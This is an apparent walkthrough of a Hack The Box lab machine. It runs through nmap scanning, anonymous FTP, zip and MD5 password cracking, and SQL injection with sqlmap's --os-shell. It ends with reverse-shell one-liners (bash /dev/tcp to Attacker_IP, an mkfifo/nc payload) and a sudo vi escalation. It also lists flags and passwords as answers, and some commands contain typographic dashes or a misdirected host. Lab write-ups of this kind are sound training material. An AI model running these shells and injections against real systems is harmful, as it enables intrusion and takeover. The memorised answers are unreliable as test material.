# README

{% stepper %}
{% step %}
### Starting Point

* Start the machine by downloading the OpenVPN file that is provided by HTB.

```bash
sudo openvpn <filename.ovpn>
```
{% endstep %}

{% step %}
### Enumeration

* Let’s fire up the machine and do an NMAP scan!

```bash
sudo nmap –sV –p- --min-rate 10000 –Pn <target-IP>
```

* TTL value refers to Linux.
* An NMAP scan reveals that there are three ports open: 21, 22, and 80.
* Since port 21 is open, the FTP service is running.

#### TASK 1

Besides SSH and HTTP, what other service is hosted on this box?

**Answer:** FTP.

* Nmap scan reveals the FTP open is ports.

#### TASK 2

This service can be configured to allow login with any password for specific username. What is that username?

**Answer:** anonymous.

* Nmap aggressive scan.

```bash
sudo nmap –sV –Pn –min-rate 1000 –A <target-ip>
```

#### TASK 3

What is the name of the file downloaded over this service?

**Answer:** backup.zip.

* And since the FTP server allows login as Anonymous, let’s log in and see what’s on it.

```bash
ftp anonymous@MachineIP
```

* Use `LS` to list the files and folders and `GET` to download the files onto your machine! Exit once the download of `Backup.zip` is complete.

#### TASK 4

What script comes with the John The Ripper toolset and generates a hash from a password protected zip archive in a format to allow for cracking attempts?

**Answer:** zip2john.

```bash
unzip backup.zip
```

* Hoping there wasn’t any password set for the zipped file, but I was wrong.
* But that’s not an issue as we have John the Ripper to help us. Using the module `zip2john`, we can convert the file into a hash that John can crack! More on this can be found in this post by secnhack: https://secnhack.in/crack-zip-files-password-using-john-the-ripper/

```bash
zip2john backup.zip > hash
```

* Now let’s get John to do the work for us.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

#### TASK 5

What is the password for the admin user on the website?

**Answer:** qwerty789.

* Now once we unzip the file with the password, we get `index.php`.
* Opening `index.php`, we get to see a password straightaway.

```bash
cat index.php
```

* But there’s a catch to it as it seems to be hashed. To find out what sort of hash is used, I went to hash-analyzer: https://www.tunnelsup.com/hash-analyzer/
* Knowing that it’s an MD5 hash, we can run Hashcat brute force on it after we put it into a file.

```bash
echo '2cb42f8734ea607eefed3b70af13bbd3' > hash1
hashcat -a 0 -m 0 hash1 /usr/share/wordlists/rockyou.txt
#hashcat –a 0 –m –0 (hashfile) -w /usr/share/wordlist/rockyou.txt --show
```

* Crackstation is the easy way.
{% endstep %}

{% step %}
### Initial Access

* Once logged in, we see a dashboard.
* Poking around, I saw that there’s a possibility of an SQL injection while using the search function. To make things easier, I’ll use SQLMAP to check if an injection is possible.
* You will need the session ID and the session cookie for authentication. To do so, you can either use Burpsuite or Cookie-editor to do so. I’ll use the latter as I’ve already set it up on my browser.

{% hint style="info" %}
Do note that the value for the cookie will differ!
{% endhint %}

#### TASK 6

What option can be passed to sqlmap to try to get command execution via the sql injection?

**Answer:** `--os-shell`

```bash
sqlmap -u 'http://MachineIP/dashboard.php?search=' --cookie="PHPSESSID=CookieValue"
```

* Since the result tells us that it is possible to do an SQL injection, let’s run SQLMAP again but with the addition of the `--os-shell` command to spawn a shell.

```bash
sqlmap -u 'http://MachineIP/dashboard.php?search=' --cookie="PHPSESSID=CookieValue" --os-shell
```

* To get the bin/sh used the nc listener and initiate the connection.

```bash
bash -c "bash -i  >& /dev/tcp/Attacker_IP/PORTNUMBER 0>&1"
```

* Got the reverse shell.

```bash
nc -lvp <PORTNUMBER>
```

* Or use the online reverse shell.

### Gaining foothold

* Now, this is a fairly unstable and very not interactive shell, so I’ll use a payload to get a reverse shell.

https://www.revshells.com/

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc MachineIP 1337 >/tmp/f
```

* Before you enter this command on the shell, start a listener on your machine with the port you specified in the payload.

```bash
nc -lvnp Port
# or
pwncat-cs -lp PORT
```

* Using pwncat as it’s more interactive and has a 😹

#### TASK 7

What program can the postgres user run as root using sudo?

**Answer:** vi

Submit user flag

**Answer:** ec9b13ca4d6229cd5cc1e09980965bf7.

* Grab the user flag!
{% endstep %}

{% step %}
### Privilege Escalation

Submit root flag

**Answer:** dd6e058e814260bc70e9bbdef2715849.

* Got the user password in `index.php`.

```bash
P@s5w0rd!
```

* Login with SSH.
* LINPEAS.
* Now I tried to run `sudo -l` to see what programs we could run.
* Added the bash shell in the file.
* Got the flag.
{% endstep %}
{% endstepper %}
